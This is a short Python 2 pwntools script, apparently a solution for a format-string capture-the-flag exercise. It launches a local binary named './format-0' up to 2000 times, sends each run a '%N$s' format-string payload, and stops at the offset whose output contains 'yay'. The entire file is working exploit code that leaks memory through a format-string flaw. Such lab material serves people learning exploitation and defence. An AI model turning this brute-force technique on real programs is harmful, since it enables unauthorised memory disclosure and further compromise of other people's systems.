#!/usr/bin/env python

from pwn import *
for i in range(2000):
	p = process('./format-0')
	p.recv()
	p.sendline("%"+str(i)+"$s")
	try:
		p.recvuntil("You typed: ")
		a = p.recv()
		if "yay" in a:
			print str(i)+": "+a
			break
	except:
		p.close()
	p.close()